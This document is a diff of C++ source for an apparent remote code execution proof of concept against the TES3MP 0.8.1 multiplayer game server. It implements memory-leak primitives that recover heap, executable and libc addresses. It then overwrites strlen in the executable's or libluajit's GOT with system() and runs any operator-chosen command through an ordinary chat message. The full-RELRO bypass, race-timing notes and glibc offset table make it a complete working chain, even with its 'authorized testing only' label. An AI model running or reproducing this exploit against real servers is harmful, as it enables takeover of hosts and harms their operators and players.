+        ReadResult r = aread(A, R, eq, k, tgt + pos, cell);
+        reads++;
+        if (!r.ok) return ReadResult{false, 0, 0};      // no relay at all: a real failure
+        size_t n = r.len > (size_t)(8 - pos) ? (size_t)(8 - pos) : r.len;
+        for (size_t i = 0; i < n; i++) b[pos + i] = (unsigned char)((r.val >> (8 * i)) & 0xff);
+        if (r.len == 0) { b[pos] = 0; pos++; continue; } // empty => this byte is 0x00
+        pos += (int)n;
+        // A short run ended because of a NUL exactly there. Record it and step over.
+        if (r.len < 8 - (size_t)(pos - n) && pos < 8) { b[pos] = 0; pos++; }
     }
-    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp; c -= 0x1000)   // bounded page scan fallback
-        if ((uint32_t)RD(A, R, eq, c, cell) == 0x464c457fU) return c;
+    uint64_t v = 0;
+    for (int i = 0; i < 8; i++) v |= (uint64_t)b[i] << (8 * i);
+    vlog("[aread8 %#llx = %#llx in %d reads]\n", (unsigned long long)tgt, (unsigned long long)v, reads);
+    return ReadResult{true, 8, v};
+}
+
+static ReadResult RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
+
+// Mask a known-good pointer INTO a module down to a load alignment and confirm the ELF magic.
+// Identical to how the libc base is found; factored out because the full-RELRO route needs it for
+// libstdc++ too. Any resolved GOT slot bound to that module is a suitable probe.
+static uint64_t remoteModuleBase(Cli &A, Cli &R, uint64_t eq, const char *cell, uint64_t ptr)
+{
+    if (ptr < 0x10000) return 0;
+    for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {
+        uint64_t c = ptr & ~(a - 1);
+        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
+    }
     return 0;
 }
 
@@ -504,7 +841,64 @@ static GlibcBuild g_glibc[] = {
     { 0xad650, 0x58750, "glibc 2.39-0ubuntu8.4-8.6 (Ubuntu 24.04)" },
     { 0xad670, 0x58750, "glibc 2.39-0ubuntu8.7 (Ubuntu 24.04)" },
     { 0xad750, 0x58750, "glibc 2.39-0ubuntu8.8 (Ubuntu 24.04)" },
+    // Read from each distro's own /lib/x86_64-linux-gnu/libc.so.6, which is the stock package.
+    { 0xa5060, 0x50d70, "glibc 2.35 (Ubuntu 22.04)" },
+    { 0x98930, 0x4c490, "glibc 2.36 (Debian 12 bookworm)" },
 };
+// Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
+// 0x00) -- which rules out walking the loader's link_map (l_addr is a load base). But &malloc IS readable
+// (libc+0xad..., non-zero low byte), and the libc base carries the ELF magic \x7fELF, whose first byte 0x7f
+// is also readable. So mask &malloc down to a load alignment and confirm the magic; fall back to a bounded
+// page scan. Modern glibc is 2 MiB-aligned, so this is typically two reads.
+static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, uint64_t image, uint64_t &mallocPtrOut)
+{
+    uint64_t mp = RD(A, R, eq, image + P.malloc_got, cell).val;  // &malloc (readable)
+    mallocPtrOut = mp;
+    if (mp < 0x10000) return 0;
+
+    // Candidate bases from the build table FIRST, one read each.
+    //
+    // Masking &malloc down to an alignment only works when the loader happened to place libc on
+    // that boundary, and that is kernel behaviour rather than a property of glibc. Measured on the
+    // pool 2026-08-23: on Ubuntu 24.04 (kernel 6.8) libc lands 2 MiB aligned and the first mask
+    // hits; on Ubuntu 22.04 (kernel 5.15) it is only page aligned, every mask misses, and the chain
+    // failed at exactly this step with &malloc=0x7fdd1bd7a060. Subtracting a KNOWN malloc offset
+    // needs no alignment assumption at all, and the offsets are already in the table below for the
+    // separate purpose of finding `system`. Using them here as well costs one read per row.
+    for (unsigned i = 0; i < sizeof(g_glibc) / sizeof(g_glibc[0]); i++) {
+        if (mp < g_glibc[i].malloc_off) continue;
+        uint64_t c = mp - g_glibc[i].malloc_off;
+        if (c & 0xfff) continue;                                 // a load base is page aligned
+        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) {
+            vlog("[libc base from table row '%s']\n", g_glibc[i].note);
+            return c;
+        }
+    }
+    for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {          // 2 MiB, 1 MiB, ... 4 KiB
+        uint64_t c = mp & ~(a - 1);
+        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
+    }
+    // Bounded page scan, and the bound is now a BUDGET rather than an address range.
+    //
+    // This used to walk back 4 MiB a page at a time: up to 1024 reads. Even at the improved
+    // per-read cost that is tens of minutes, and at the original cost it was hours. A fallback
+    // nobody can afford to let finish is not a fallback, it is a hang that looks like progress,
+    // and it is what a caller with a sane timeout actually experiences when the mask scan misses.
+    // Cap it, then fail with something the operator can act on.
+    const int budget = 24;
+    int used = 0;
+    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp && used < budget; c -= 0x1000, used++)
+        if ((uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) return c;
+    printf("[!] libc base not found: &malloc=%#llx is not %s-aligned to an ELF header, and the\n"
+           "    page scan gave up after %d pages. The loader placed libc at an alignment this\n"
+           "    scan does not cover, which is kernel and loader behaviour rather than a bad leak.\n"
+           "    Supply the offset directly with --malloc-off, or hand over the matching public\n"
+           "    libc.so.6 with --libc.\n",
+           (unsigned long long)mp, "2MiB..4KiB", budget);
+    return 0;
+}
+
+
 
 static void usage(const char *a0)
 {
@@ -512,15 +906,16 @@ static void usage(const char *a0)
       "tes3mp-rce - remote code execution PoC for TES3MP 0.8.1 (authorized testing only)\n\n"
       "usage: %s [options] <host> [port]\n\n"
       "  -P, --server-password <pw>  server password, i.e. the `password` setting in\n"
-      "                              tes3mp-server-default.cfg. Default: empty (upstream default).\n"
-      "                              This is NOT a user account: the chain never logs in.\n"
+      "                              tes3mp-server-default.cfg. Default: \"blankpassword\", which is\n"
+      "                              what the server itself substitutes for an empty setting, so an\n"
+      "                              unpassworded target is joined without a log line. NOT an account.\n"
       "  -c, --command <cmd>         command to run on the server host\n"
       "                              (default: touch /tmp/tes3mp-rce-proof)\n"
       "  -t, --token <tok>           RakNet connect token: TES3MP_VERSION + PROTO_VERSION + commitHash.\n"
       "                              Public per build, not a secret. Default: 0.8.1 release.\n"
       "  -b, --bind <ip>             local address for the second (reader) client (default 127.0.0.2)\n"
       "  -n, --name <base>           player name prefix (default: rce)\n"
-      "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
+      "  -C, --cell <name>           cell to meet in (default: ExploitCell-<random>, so runs stay isolated)\n"
       "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
       "                              Touches no server memory: safe to run against a live server.\n"
       "  -s, --shell                 RE-ENTRY mode. Does NOT exploit anything: connects as an ordinary\n"
@@ -531,6 +926,21 @@ static void usage(const char *a0)
       "                              CoreScripts gates chat on IsLoggedIn(); it registers on first use\n"
       "                              and so leaves data/player/<name>.json on the target.\n"
       "  -A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)\n"
+      "      --via-luajit            Hijack strlen@got inside LIBLUAJIT instead of the executable's.\n"
+      "                              Use against a FULL-RELRO server. The executable's GOT is then\n"
+      "                              read-only, but libluajit is the distro's package, ships partial\n"
+      "                              RELRO, and lua_pushstring calls strlen(str) through its own PLT.\n"
+      "                              ProcessorChatMsg hands player.chatMessage.c_str() to exactly that\n"
+      "                              call, so the payload arrives as an ordinary chat message and the\n"
+      "                              executable's GOT is never touched. Needs lua_probe_got,\n"
+      "                              lua_probe_off and lua_strlen_got in the profile.\n"
+      "  -O, --bot                   LOAD GENERATOR. Join a cell as an ordinary client and send\n"
+      "                              in-bounds equipment changes forever. Exploits nothing. Exists to\n"
+      "                              put a second player's relays in the cell so the GUID filter can be\n"
+      "                              tested. -I sets the interval ms, -X the in-bounds index.\n"
+      "  -F, --profile <file>        load a target profile (layout + RVAs). tools/gen-profile derives\n"
+      "                              the layout half from a TES3MP tree; -B derives the RVA half from\n"
+      "                              the target binary and overrides what the profile supplied.\n"
       "  -B, --server-bin <path>     read the vtable/strlen@got/malloc@got RVAs from a copy of the TARGET's\n"
       "                              tes3mp-server.x86_64. Needed only if the target is not the stock 0.8.1.\n"
       "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
@@ -554,7 +964,13 @@ int main(int argc, char **argv)
     // macOS (lo0 has only 127.0.0.1) and cannot route to a remote server anyway; "" lets the OS pick the
     // egress interface, so A and R simply get two source ports from the same address, which the server
     // keys apart by SystemAddress. Override with -b only if you specifically need a fixed source address.
-    const char *bind2 = "", *nameBase = "rce", *cell = "ExploitCell";
+    const char *bind2 = "", *nameBase = "rce";
+    // Randomised so two runs never share a cell, and so a real player cannot wander into ours and
+    // have their equipment relays parsed as our leak. Belt and braces with the GUID filter below.
+    char cellbuf[64];
+    { unsigned seed = (unsigned)getpid() ^ (unsigned)time(0);
+      snprintf(cellbuf, sizeof cellbuf, "ExploitCell-%06x", seed & 0xffffff); }
+    const char *cell = cellbuf;
     int shellMode = 0; const char *acctPass = "rce-poc-pw-1";
     static struct option lo[] = {
         {"shell", no_argument, 0, 's'}, {"account-pass", required_argument, 0, 'A'},
@@ -564,11 +980,16 @@ int main(int argc, char **argv)
         {"probe", no_argument, 0, 'p'},
         {"libc", required_argument, 0, 'L'}, {"server-bin", required_argument, 0, 'B'},
         {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
+        {"profile", required_argument, 0, 'F'},
+        {"via-luajit", no_argument, 0, 'X' + 1000},    // long-only
+        {"bot", no_argument, 0, 'O'}, {"bot-interval", required_argument, 0, 'I'},
+        {"bot-index", required_argument, 0, 'X'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
-    const char *libcPath = 0, *serverBin = 0;
+    const char *libcPath = 0, *serverBin = 0, *profPath = 0;
+    int botMode = 0, botInterval = 700, botIndex = 3, viaLua = 0;
     int mGiven = 0, sGiven = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:F:OI:X:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -581,6 +1002,11 @@ int main(int argc, char **argv)
             case 'A': acctPass = optarg; break;
             case 'L': libcPath = optarg; break;
             case 'B': serverBin = optarg; break;
+            case 'F': profPath = optarg; break;
+            case 'X' + 1000: viaLua = 1; g_viaLua = 1; break;
+            case 'O': botMode = 1; break;
+            case 'I': botInterval = atoi(optarg); break;
+            case 'X': botIndex = atoi(optarg); break;
             case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
             case 'S': P.system_off = strtoull(optarg, 0, 0); sGiven = 1; break;
             case 'v': g_verbose = 1; break;
@@ -589,6 +1015,13 @@ int main(int argc, char **argv)
     }
     if (optind < argc) g_host = argv[optind++];
     if (optind < argc) g_port = atoi(argv[optind++]);
+
+    if (botMode) {
+        printf("[*] bot -> %s:%d, cell %s. Generates ordinary in-bounds equipment traffic; exploits nothing.\n",
+               g_host, g_port, cell);
+        fingerprint();
+        return runBot(nameBase, cell, botInterval, botIndex);
+    }
 
     if (shellMode) {
         int cmdGiven = 0;
@@ -600,8 +1033,9 @@ int main(int argc, char **argv)
         return runShell(nameBase, acctPass, cmdGiven ? cmd : 0);
     }
 
+    if (profPath && !loadProfile(profPath)) return 2;
     if (serverBin) {
-        if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got)) {
+        if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got, P.lua_probe_got)) {
             printf("[!] could not read RVAs from %s\n", serverBin); return 2;
         }
         printf("[*] server %s: vtable@%#llx strlen@got=%#llx malloc@got=%#llx\n", serverBin,
@@ -625,13 +1059,24 @@ int main(int argc, char **argv)
     std::string nA = std::string(nameBase) + "A", nR = std::string(nameBase) + "R";
     Cli A{}, R{};
     if (!connectTo(A, "")) { printf("[!] client A could not connect\n"); return 1; }
+    g_srcGuid = A.peer->GetMyGUID(); g_srcKnown = true;
     handshake(A, nA.c_str());
     if (!connectTo(R, bind2)) { printf("[!] client R could not connect\n"); return 1; }
     handshake(R, nR.c_str());
     if (!stillConnected(A) || !stillConnected(R)) {
-        printf("[!] kicked during handshake. %s\n", *g_srvpass
-               ? "The server password supplied with -P was rejected."
-               : "This server is password-protected: supply it with -P.");
+        // Do not attribute this to the password. A disconnect during handshake has several causes
+        // and the tool cannot tell them apart from here: a wrong -P, a ban, a full server, or a
+        // server still recovering from a previous run of this very chain, which kicks stale players
+        // as it restarts. Saying "password rejected" for all of them sent me chasing a password that
+        // was correct while the real cause was in the server log.
+        printf("[!] disconnected during handshake, before POSTLOADED. Cannot tell why from here.\n"
+               "    Candidates, in the order worth checking:\n"
+               "      - the server log. It names the actual reason (\"Kicking player ...\",\n"
+               "        \"Wrong server password ...\", banlist).\n"
+               "      - a previous run of this chain. It crashes the target, and a restarting server\n"
+               "        kicks stale players for several seconds afterwards.\n"
+               "      - -P: currently %s.\n",
+               *g_srvpass ? "supplied" : "not supplied (sending the default)");
         return 4;
     }
     loadCell(A, cell); loadCell(R, cell); drainboth(A, R, 600);
@@ -639,6 +1084,15 @@ int main(int argc, char **argv)
 
     if (g_probe) {
         printf("[probe] reachable and handshake accepted. Both clients are in-cell.\n");
+        printf("[probe] profile: vtable@%#llx strlen@got=%#llx malloc@got=%#llx  (%s)\n",
+               (unsigned long long)P.vtable_rva, (unsigned long long)P.strlen_got,
+               (unsigned long long)P.malloc_got, serverBin ? serverBin : "baked-in 0.8.1 defaults");
+        printf("[probe] libc:    %s\n", libcPath ? libcPath
+               : (sGiven ? "--system-off override" : "build table, keyed on the remote malloc offset"));
+        printf("[probe] mitigations: %s\n", serverBin
+               ? "checked against the supplied binary (partial RELRO + libstdc++ required)"
+               : "NOT CHECKED -- pass --server-bin to verify RELRO and the std::string ABI");
+        if (g_foreign) printf("[probe] %lu foreign equipment relays already seen: this cell is NOT empty.\n", g_foreign);
         printf("[probe] this is the point the exploit begins; stopping here without touching server memory.\n");
         printf("[probe] drop -p (and set -c) to run the full chain.\n");
         return 0;
@@ -646,7 +1100,7 @@ int main(int argc, char **argv)
 
     // 1. a live heap pointer (chatMessage's buffer). Not the base: only a valid writable address.
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
-    truncEq(A, 25); int oi; uint64_t heap = harvest(R, oi);
+    truncEq(A, (int)P.leak_heap_idx); int oi; uint64_t heap = harvest(R, oi);
     if (heap < 0x100000000ULL) { printf("[!] heap leak failed\n"); return 3; }
     printf("[+] heap scratch pointer  %#llx\n", (unsigned long long)heap);
 
@@ -657,30 +1111,121 @@ int main(int argc, char **argv)
 
     // 3. the real object base, from creatureRefId's self-pointer
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
-    truncEq(A, 28); uint64_t l28 = harvest(R, oi);
+    truncEq(A, (int)P.leak_self_idx); uint64_t l28 = harvest(R, oi);
     { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY); RakString gn(""); bs.Write(gn);
       int z = 0; bs.Write(z); bs.Write(z); bool ps = false; bs.Write(ps); snd(A, bs); } usleep(150000);
     if (l28 < 0x100000000ULL) { printf("[!] base leak failed\n"); return 3; }
-    uint64_t base = l28 - 0x16f0, eq = base + 0xe00;
+    uint64_t base = l28 - P.self_ptr_delta, eq = base + P.equip_off;
     printf("[+] BasePlayer base      %#llx\n", (unsigned long long)base);
 
     // 4. image base, from the Player vtable pointer at base-8
     sendChatStr(A, std::string(400, 'Z')); drainboth(A, R, 200);   // prime chatMessage (heap buffer, capacity >= 400)
-    uint64_t v = aread(A, R, eq, 7, base - 8, cell);
+    // Re-leak _M_p AFTER that priming message. Growing a std::string past SSO reallocates, so the
+    // step-1 pointer is stale from here on. --via-luajit fires its payload by pointing chatMessage
+    // back at its own real buffer and sending one ordinary chat message, and that needs the CURRENT
+    // pointer: writing the payload anywhere else works, but corrupts whatever it lands on.
+    for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
+    truncEq(A, (int)P.leak_heap_idx); uint64_t chatbuf = harvest(R, oi);
+    if (viaLua && chatbuf < 0x100000000ULL) {
+        printf("[!] chat buffer re-leak failed (%#llx); --via-luajit needs it for the trigger.\n",
+               (unsigned long long)chatbuf);
+        return 3;
+    }
+    uint64_t v = aread8(A, R, eq, 7, base - 8, cell).val;
     uint64_t pie = v > 0x100000000ULL ? v - P.vtable_rva : 0;
-    if (!pie || (pie & 0xfff)) { printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v); return 3; }
+    if (!pie || (pie & 0xfff)) {
+        printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v);
+        restorePlants(A, eq); return 3;
+    }
     printf("[+] image base           %#llx  (page aligned)\n", (unsigned long long)pie);
 
-    // 5. libc base + system(). By default this is fully remote and file-free: walk the loader's link_map to
-    //    the libc base, then resolve system from libc's own GNU hash + .dynsym. If the operator supplied
-    //    offsets (--libc, or both --malloc-off and --system-off) use the fast path instead.
+    // 5. libc base + system(). The base is derived remotely and file-free: mask &malloc down to a load
+    //    alignment and confirm the ELF magic (remoteLibcBase). system's OFFSET is not derived; it comes
+    //    from the build table keyed on the remotely-computed malloc offset, or from --system-off/--libc.
+    //    A link_map walk would give both, but l_addr is page-aligned and the read is strlen-truncated,
+    //    so it reads back as an empty string. Fixing that needs the shifted read (fork 4), not a table.
     uint64_t sgot = pie + P.strlen_got;
+    // FULL-RELRO ROUTE. A read-only GOT in the executable says nothing about the shared objects it
+    // loads. Sixteen ELF images are mapped into a stock 0.8.1 server on Ubuntu 24.04 and four still
+    // ship a writable .got.plt; libluajit-5.1 is one. Its GNU_RELRO ends at +0x8e370, its .got.plt
+    // runs to +0x902f8, and the live mapping is rw-p from +0x90000 on, so every libc slot it
+    // imports stays writable for the process lifetime. It is the DISTRO's package
+    // (libluajit-5.1-2), so rebuilding the server with -z now does not close it.
+    //
+    // Reachability is what decides whether a writable slot is worth anything, and it is where the
+    // libstdc++ version of this idea died (docs/CHAIN.md records why). Here the path is one this
+    // chain already drives:
+    //     ProcessorChatMsg::Do -> Script::Call<OnPlayerSendMessage>(id, player.chatMessage.c_str())
+    //     LangLua::Call 's'    -> luabridge::Stack<const char*>::push -> lua_pushstring(L, str)
+    //     lua_pushstring       -> strlen(str), THROUGH libluajit's own PLT
+    // arg1 is the chat text itself, so poisoning that slot turns an ordinary chat packet into
+    // system(<our text>). The executable's GOT is never written.
+    if (viaLua) {
+        // Shape check on the profile before spending packets on it. A GOT rva sits in the megabytes,
+        // a class offset in the kilobytes; if those are the wrong way round the profile is shifted.
+        if (P.lua_probe_got < 0x10000 || P.anim_group_off > 0x10000 || P.lua_strlen_got < 0x1000) {
+            printf("[!] --via-luajit profile looks shifted: lua_probe_got=%#llx anim_group_off=%#llx\n"
+                   "    lua_strlen_got=%#llx. Expected a main-binary RVA, a class offset and a\n"
+                   "    libluajit RVA, in that order.\n",
+                   (unsigned long long)P.lua_probe_got, (unsigned long long)P.anim_group_off,
+                   (unsigned long long)P.lua_strlen_got);
+            restorePlants(A, eq); return 3;
+        }
+        uint64_t probe = aread8(A, R, eq, 7, pie + P.lua_probe_got, cell).val;
+        // Subtract the known symbol offset FIRST, and only then fall back to the alignment scan.
+        // libluajit is ~580 KiB and the loader maps it PAGE aligned, never on one of the larger
+        // boundaries remoteModuleBase() tries, so for this module the scan cannot succeed: every
+        // candidate mask lands below the real base and reads a byte of some other mapping. That is
+        // the same failure the cross-distro run hit on libc under kernel 5.15, and it takes the
+        // same fix, a public per-build offset. The ELF magic is still checked, so a wrong offset
+        // is caught here rather than at the write.
+        uint64_t lj = 0;
+        if (probe > P.lua_probe_off) {
+            uint64_t c = probe - P.lua_probe_off;
+            if (!(c & 0xfff) && (uint32_t)RD(A, R, eq, c, cell).val == 0x464c457fU) lj = c;
+        }
+        if (!lj) lj = remoteModuleBase(A, R, eq, cell, probe);
+        if (!lj || (lj & 0xfff)) {
+            printf("[!] libluajit base resolution failed (probe=%#llx via main+%#llx).\n",
+                   (unsigned long long)probe, (unsigned long long)P.lua_probe_got);
+            restorePlants(A, eq); return 3;
+        }
+        sgot = lj + P.lua_strlen_got;
+        printf("[+] libluajit base       %#llx  (page aligned; probe %#llx)\n",
+               (unsigned long long)lj, (unsigned long long)probe);
+        printf("[+] TARGETING libluajit strlen@got, not the executable's. Independent of how the\n"
+               "    SERVER was built: that slot belongs to the distro's libluajit.\n");
+    }
     // libc base: derived remotely and file-free (mask &malloc to a load alignment, confirm the ELF magic).
     // --malloc-off forces the subtraction path instead, for a glibc whose load alignment defeats the scan.
     uint64_t libc = 0, mp = 0;
-    if (mGiven) { mp = aread(A, R, eq, 7, pie + P.malloc_got, cell); libc = mp > 0x100000000ULL ? mp - P.malloc_off : 0; }
+    if (mGiven) { mp = aread(A, R, eq, 7, pie + P.malloc_got, cell).val; libc = mp > 0x100000000ULL ? mp - P.malloc_off : 0; }
     else        { libc = remoteLibcBase(A, R, eq, cell, pie, mp); }
-    if (!libc || (libc & 0xfff)) { printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp); return 3; }
+    if (!libc || (libc & 0xfff)) {
+        printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp);
+        restorePlants(A, eq); return 3;
+    }
+    // Proof that the read is now NUL-transparent, on the one value that used to be unreadable.
+    // libc's base is page aligned, so its low byte is 0x00 and a single strlen-bounded read returns
+    // an empty string. If this comes back equal to the base we derived by masking, the shifted read
+    // works and a link_map walk (whose l_addr entries are all load bases) is no longer blocked.
+    // Proof, on a value the OLD primitive could not read at all.
+    //
+    // libc+9 covers e_ident's padding and the low byte of e_type: seven zero bytes followed by
+    // 0x03, ET_DYN. Its LOW byte is 0x00, so a single strlen-bounded read returns an empty string
+    // and the old code could not distinguish that from a failed read. If the shifted read returns
+    // 0x0300000000000000 here, then a value whose low byte is zero is readable, which is exactly
+    // the property l_addr needs and exactly why the link_map walk was abandoned.
+    if (g_verbose) {
+        ReadResult zc = aread8(A, R, eq, 7, libc + 9, cell);
+        ReadResult one = aread(A, R, eq, 7, libc + 9, cell);   // what a single read sees
+        printf("[v] zero-low-byte probe at libc+9: shifted=%#llx (len %zu), single read len=%zu\n"
+               "[v]   %s\n",
+               (unsigned long long)zc.val, zc.len, one.len,
+               zc.ok && zc.val == 0x0300000000000000ULL
+                   ? "NUL-TRANSPARENT: recovered ET_DYN behind seven zero bytes that a single read reports as empty"
+                   : "unexpected; this build's ELF header may differ");
+    }
     uint64_t moff = mp - libc;
     printf("[+] libc base            %#llx  (page aligned; malloc offset %#llx)\n", (unsigned long long)libc, (unsigned long long)moff);
     // system offset: explicit override, then --libc file, then the build table keyed by the malloc offset.
@@ -692,7 +1237,7 @@ int main(int argc, char **argv)
         printf("[!] glibc build not recognized (malloc offset %#llx).\n", (unsigned long long)moff);
         printf("    Supply system's offset: --system-off <hex>, or --libc <the matching public libc.so.6>.\n");
         printf("    It is public per-distro data (e.g. the Ubuntu libc6 package), not anything off the target.\n");
-        return 3;
+        restorePlants(A, eq); return 3;
     }
     uint64_t sys = libc + soff;
     printf("[+] system()             %#llx  (%s)\n", (unsigned long long)sys, ssrc);
@@ -700,7 +1245,10 @@ int main(int argc, char **argv)
 
     // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
     //    or _M_replace takes the reallocating path and free()s the GOT address itself.
-    uint64_t eqk = eq + 80 * 7;
+    // From here the plant is deliberate and must NOT be restored: it is the weapon. Drop it from the
+    // shadow so nothing later tries to undo it.
+    g_plant[7] = Plant{};
+    uint64_t eqk = eq + P.item_stride * 7;
     for (int i = 0; i < 6; i++) {
         unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
         redirect(A, eqk + i);
@@ -711,20 +1259,90 @@ int main(int argc, char **argv)
     { unsigned char cap = 0x40; redirect(A, eqk + 16); sendChatBytes(A, &cap, 1); }
     drainboth(A, R, 400);
 
-    // 7. one packet, two items. Item 7's assignment writes `system` into strlen@got; item 5's
-    //    assignment then calls the hijacked strlen on the payload. Both indices are in bounds.
-    { BitStream bs; hdr(A, bs, ID_PLAYER_EQUIPMENT);
-      bs.Write(false); uint32_t two = 2; bs.Write(two);
-      int i7 = 7; bs.Write(i7);
-      uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
-      RakString r7 = rstr(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
-      int one = 1, zero = 0; bs.Write(one); bs.Write(zero); bs.Write(zero);
-      int i5 = 5; bs.Write(i5);
-      RakString r5 = rstr(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
-      bs.Write(one); bs.Write(zero); bs.Write(zero);
-      snd(A, bs); }
-    printf("[+] trigger sent: strlen@got <- system, then strlen(\"%s\")\n", cmd);
+    // 7. --via-luajit splits the write from the trigger, because on that route they cannot share a
+    //    packet. lua_pushstring passes strlen's RETURN VALUE straight to lj_str_new as a byte count,
+    //    so any call through the poisoned slot before the payload is in place reads system()'s exit
+    //    status as a length and walks off the mapping. The equipment processor is the safe writer:
+    //    ProcessorPlayerEquipment::Do calls Lua with player.getId() and no string, so it never
+    //    reaches lua_pushstring at all.
+    if (viaLua) {
+        // The poisoned slot is shared, so WHICH packet performs the write decides whether the chain
+        // works. Every Script::Call opens with lua_getglobal(<callback name>), and lua_getglobal
+        // takes strlen of that name through the very slot being hijacked. Writing from a packet
+        // whose processor calls Lua therefore spends the hijack on a string literal instead of the
+        // payload. Measured, writing from ID_PLAYER_EQUIPMENT:
+        //     sh: 1: OnPlayerEquipment: not found      <- the callback name reached system()
+        //     sh: 1: attempt: not found                <- then the "attempt to call a nil value"
+        //     sh: 1: nil: not found                       error path, because the global lookup used
+        //                                                 system()'s exit status as a key length
+        // followed by SIGSEGV, all before the payload packet was read.
+        //
+        // ID_PLAYER_ANIM_PLAY is the way out. PacketPlayerAnimPlay::Packet does
+        // RW(player->animation.groupname), an ordinary std::string assignment -- the same write
+        // primitive -- while ProcessorPlayerAnimPlay::Do only calls sendToLoaded and reaches no
+        // callback at all. So the slot can be poisoned without spending it.
+
+        // 7a. aim animation.groupname at the slot, and give it a length and capacity that keep
+        //     _M_replace on the in-place path (a realloc would free() the GOT address).
+        uint64_t gn = base + P.anim_group_off;
+        for (int i = 0; i < 6; i++) {
+            unsigned char b = (unsigned char)((sgot >> (8 * i)) & 0xff);
+            redirect(A, gn + i);
+            if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
+        }
+        redirect(A, gn + 6);  sendChatBytes(A, (const void *)"", 0);
+        { unsigned char z = 0;    redirect(A, gn + 8);  sendChatBytes(A, &z, 1); }
+        { unsigned char cap = 0x40; redirect(A, gn + 16); sendChatBytes(A, &cap, 1); }
+
+        // 7b. put chatMessage back on its own buffer NOW, while the slot is still clean. This is an
+        //     equipment packet: after 7c it would fire the hijack on "OnPlayerEquipment".
+        redirect(A, chatbuf);
+        drainboth(A, R, 400);
+
+        // 7c. the write. groupname = the low 6 bytes of system, no callback anywhere on the path.
+        { BitStream bs; hdr(A, bs, ID_PLAYER_ANIM_PLAY);
+          uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
+          RakString g = rstr(sb); bs.Write(g);
+          int mo = 0, cn = 0; bs.Write(mo); bs.Write(cn); bool ps = false; bs.Write(ps);
+          snd(A, bs); }
+        // DELIBERATELY no delay before 7d. Everything this client sends is RELIABLE_ORDERED on
+        // channel 0, so the server processes the two packets in order, and back-to-back they land
+        // in the same pass of the packet loop. Any gap here is a window for a Lua callback that is
+        // not ours to reach the poisoned slot first, and CoreScripts has a standing one:
+        // serverCore.lua:197 arms `UpdateTime` on a 1-second timer. A 250 ms sleep here lost the
+        // race roughly a quarter of the time, and the server said exactly what took the shot:
+        //     sh: 1: UpdateTime: not found
+
+        // 7d. the payload, as an ordinary chat message. ProcessorChatMsg reaches
+        //     Script::Call<OnPlayerSendMessage>, which spends the FIRST hijacked call on the
+        //     literal "OnPlayerSendMessage" and the second on lua_pushstring(chatMessage.c_str()).
+        //     The first one is survivable -- system() returns 127<<8, lua_getglobal takes that as a
+        //     key length, looks up a global that does not exist and pushes nil -- and the arguments
+        //     are all pushed before the pcall that would fail on that nil. So the payload runs.
+        sendChatBytes(A, cmd, strlen(cmd));
+        printf("[+] trigger sent: libluajit strlen@got <- system via ID_PLAYER_ANIM_PLAY (no callback\n"
+               "    on that path), then chat \"%s\" -> lua_pushstring -> system\n", cmd);
+    } else {
+        // one packet, two items. Item 7's assignment writes `system` into strlen@got; item 5's
+        // assignment then calls the hijacked strlen on the payload. Both indices are in bounds.
+        { BitStream bs; hdr(A, bs, ID_PLAYER_EQUIPMENT);
+          bs.Write(false); uint32_t two = 2; bs.Write(two);
+          int i7 = 7; bs.Write(i7);
+          uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
+          RakString r7 = rstr(sb); RakString::SerializeCompressed(r7.C_String(), &bs);
+          int one = 1, zero = 0; bs.Write(one); bs.Write(zero); bs.Write(zero);
+          int i5 = 5; bs.Write(i5);
+          RakString r5 = rstr(cmd); RakString::SerializeCompressed(r5.C_String(), &bs);
+          bs.Write(one); bs.Write(zero); bs.Write(zero);
+          snd(A, bs); }
